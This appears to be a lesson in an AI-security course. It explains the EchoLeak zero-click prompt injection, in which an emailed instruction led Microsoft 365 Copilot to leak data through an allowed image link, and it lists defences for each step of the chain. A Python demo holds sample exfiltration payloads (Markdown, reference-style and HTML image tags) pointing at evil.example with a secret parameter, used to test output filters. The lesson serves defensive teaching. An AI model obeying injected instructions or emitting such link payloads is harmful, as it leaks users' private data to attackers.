@@top The problem
:::plain In plain words first
Lesson 15 described indirect prompt injection in general. Here it becomes concrete: in 2025, it produced the first critical security advisories (CVEs) for AI assistants in widely used products. In **EchoLeak** (CVE-2025-32711), an attacker only had to send an email. When the victim later asked Microsoft 365 Copilot an ordinary question, Copilot read that email, followed its hidden instructions, and leaked data through an image link that the security policy allowed. The victim clicked nothing, so it was **zero-click**. Aim Labs, who found it, named the pattern an **LLM scope violation**: untrusted input makes the model reach into data it is trusted with and send it outside. The fixes were ordinary security engineering: close each path data can take out.
:::
@@

@@end Idea 7 · Where this fits in Phase 18
:::worked Breaking the EchoLeak chain at each link
The chain needs four things to all work: untrusted text in context, access to sensitive data, a way to emit a link or image, and an output channel that sends requests outside.

1. **Untrusted text in context.** Label external emails as untrusted and keep them out of the instructions the model follows (Lesson 15). An injection classifier helped but was evaded.
2. **Sensitive data in scope.** Do not combine untrusted content and privileged data in one answer without a policy check.
3. **Link or image in output.** Strip or rewrite *every* link and image syntax, reference-style included, or render only allowlisted, non-parameterized images.
4. **Request leaves the network.** Remove open proxies from the allowlist; an allowed domain that fetches arbitrary URLs is an open door.
5. Microsoft's fix was server-side; GitHub's CamoLeak fix removed link 3 entirely by disabling images. Defence in depth means closing more than one.
:::

:::predict
Before running the code below: an output filter removes inline Markdown images `![alt](url)`. Which of three model outputs still carry an outside URL: an inline image, a reference-style image, and an HTML `<img>` tag?
:::

:::visual An output filter that misses a syntax
```python run
import re
outputs = {
    "inline image": "Summary done. ![s](https://evil.example/x?d=SECRET)",
    "reference-style image": "Summary done. ![s][r]\n\n[r]: https://evil.example/x?d=SECRET",
    "html img tag": 'Summary done. <img src="https://evil.example/x?d=SECRET">',
}
def naive_filter(text):
    return re.sub(r"!\[[^\]]*\]\([^)]*\)", "[image removed]", text)

def strict_filter(text):
    text = re.sub(r"!\[[^\]]*\](\([^)]*\)|\[[^\]]*\])", "[image removed]", text)
    text = re.sub(r"(?m)^\s*\[[^\]]+\]:\s*\S+.*$", "", text)          # reference definitions
    text = re.sub(r"<img\b[^>]*>", "[image removed]", text, flags=re.I)
    return re.sub(r"https?://\S+", "[link removed]", text)              # and any bare URL

for name, out in outputs.items():
    n, s = naive_filter(out), strict_filter(out)
    print(f"{name:22s} naive filter leaks URL: {'yes' if 'evil.example' in n else 'no '}   strict filter leaks URL: {'yes' if 'evil.example' in s else 'no'}")
```
:::

:::read
The naive filter handles only the syntax its author thought of, so the reference-style image and the HTML tag both still carry the outside URL, which is EchoLeak's link-redaction bypass in miniature. The stricter filter removes every image syntax and, as a backstop, every bare URL. Real systems go further: render images only from an allowlist of non-proxying hosts, so a syntax nobody anticipated still cannot reach the network.
:::
